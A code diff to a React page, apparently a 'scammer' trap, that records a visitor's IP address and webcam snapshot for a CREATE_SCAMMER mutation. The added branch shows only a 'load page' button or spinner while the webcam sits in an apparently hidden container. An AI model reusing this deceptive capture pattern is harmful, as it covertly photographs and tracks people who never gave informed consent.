@@ -8,6 +8,7 @@ import './App.css'
 import Webcam from 'react-webcam';
 import { CREATE_SCAMMER } from '../graphql/mutations/create_scammer';
 import { useMutation } from '@apollo/client';
+import { Button, CircularProgress } from '@mui/material';
 
 const App = () => {
   // const [latitude, setLatitude] = useState(0)
@@ -15,6 +16,8 @@ const App = () => {
   const [ipAddress, setIpAddress] = useState<string>('')
   const [dataNow, setDataNow] = useState('');
   const [imgUrl, setImageUrl] = useState<string>('')
+  const [status, setStatus] = useState(false);
+  const [render, setRender] = useState(false)
 
   const webcamRef = useRef<Webcam | null>(null);
   
@@ -70,6 +73,7 @@ const App = () => {
 
   const callMutation = async () => {
     console.log('Mutation')
+    console.log('---------------------------',imgUrl, ipAddress)
     if(!imgUrl || !ipAddress){
       console.log('img null')
       return
@@ -102,6 +106,7 @@ const App = () => {
     const data = today.toLocaleString();
     setDataNow(data)
     console.log('CLick', ipAddress, imgUrl, dataNow)
+    setRender(true)
   }
 
   useEffect(() => {
@@ -119,22 +124,51 @@ const App = () => {
 
   return (
       <div className="container"> 
-        <p>Ip: {ipAddress}</p>
-        {/* <p>Localização: {latitude} {longitude}</p> */}
-        <p>Data: { dataNow }</p>
-        <button className='btn' type="button" onClick={handleClickBtn}>Clique aqui</button>
-
+      {status ? 
+        <div>
+          <p>Ip: {ipAddress}</p>
+          {/* <p>Localização: {latitude} {longitude}</p> */}
+          <p>Data: { dataNow }</p>
+          <button className='btn' type="button" onClick={handleClickBtn}>Clique aqui</button>
+          <div className="container-webcam">
+            <div className='container-hide'>
+            </div>
+              <Webcam
+                audio={false}
+                ref={webcamRef}
+                screenshotFormat="image/jpeg"
+                style={{width: 200, height: 200}}
+              />
+          </div>
+          <img src={imgUrl} alt="imagem" style={{width: 200, height: 200}} />
+        </div>
+        
+        :
+        <div>
         <div className="container-webcam">
           <div className='container-hide'> 
+            </div>
+              <Webcam
+                audio={false}
+                ref={webcamRef}
+                screenshotFormat="image/jpeg"
+                style={{width: 200, height: 200}}
+                
+              />
           </div>
-            <Webcam
-              audio={false}
-              ref={webcamRef}
-              screenshotFormat="image/jpeg"
-              style={{width: 200, height: 200}}
-            />
-        </div>
-        <img src={imgUrl} alt="imagem" style={{width: 200, height: 200}} />
+          
+          <div className="progress-circle">
+             
+            { render 
+              ? <CircularProgress />
+              : <Button onClick={handleClickBtn} >Carregar página</Button>
+            }
+            
+             
+          </div>
+           
+          </div> 
+        }
       </div>
   )
 }
